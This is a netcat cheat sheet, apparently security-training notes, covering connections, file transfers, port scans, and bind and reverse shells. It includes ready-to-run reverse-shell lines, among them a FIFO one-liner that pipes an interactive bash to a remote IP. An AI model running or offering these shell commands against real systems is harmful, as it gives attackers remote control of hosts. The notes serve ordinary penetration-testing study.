## netcat

A simple “utility which reads and writes data across network connections, using TCP or UDP protocols.  

```bash
netcat [OPTIONS] host [REMOTE_PORT]
# Options
-n		# Numeric-only IP's
-v		# Verbose output, use twice for more verbose
-l		# listen (Server mode)
-p		# Used with -l to specify port
```

### Basic Connection

```bash
# Connect to remote end on port 80
nc -nv 1.1.1.1 80

# Create server listening on port 4444
nc -nlvp 4444
```

### File Transfers

```bash
# Receive data from netcat and write to file
# Note that either client or server can receive/send, the important thing is the direction of the redirects
# Note that you may have to use CTRL+C to kill the transfer if it hangs when its done.  There's no indicator of completion, so you have to guess.
nc -nlvp 4444 > outfile

# Send data through netcat
nc -nv 1.1.1.1 4444 < infile
```

### Bind Shell

To create a bind shell, netcat will execute a command shell and all stdin, stdout, stderr streams through netcat instead of from/to the local machine.  In a normal bind shell, the following are true:

- Command shell is received from the server.  
- The server end executes a shell on client connect.  
- Users are able to interact with the shell, much like SSH.  

```bash
# ---TARGET SIDE
# Create a server & execute shell
netcat -nlvp 4444 -e cmd.exe
# Options
-e COMMAND		# Tells netcat to execute COMMAND once someone connects and redirects all STDin/out/err to the port.

# ---ATTACKER SIDE
netcat -nv 1.1.1.1 4444
```

### Reverse Shell

A reverse shell is a bind shell in the opposite direction.  The following are true for a reverse shell:

- A command shell is sent from the client to the server.  
- The client end executes the shell once connect to the server.  
- The server end interacts with the shell running on the client, like SSH in reverse.  
- Useful for accessing the shell of a host behind a firewall.   

```bash
# ---ATTACKER SIDE
# Create a server
netcat -nlvp 4444

# ---TARGET SIDE
# Connect & execute shell
netcat -nv 1.1.1.1 4444 -e /bin/bash
```

If netcat's `-e` is disabled, you can use this command to get around it:

```bash
# This basically creates a circular loop between a FIFO file and the netcat session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.119.216 8001 >/tmp/f; rm /tmp/p
```

### Port Scanning

#### TCP Port Scan

```bash
nc -nvv -w 1 -z 1.1.1.1 3388-3390

# Options
-vv 	# Be extra verbose
-w 1	# wait 1 second for timeout
-z 		# Zero-I/O mode (used for scanning)
```

#### UDP Port Scan

```bash
nc -nvz -w 1 -u 1.1.1.1 160-162

# Options
-u		# UDP mode
```



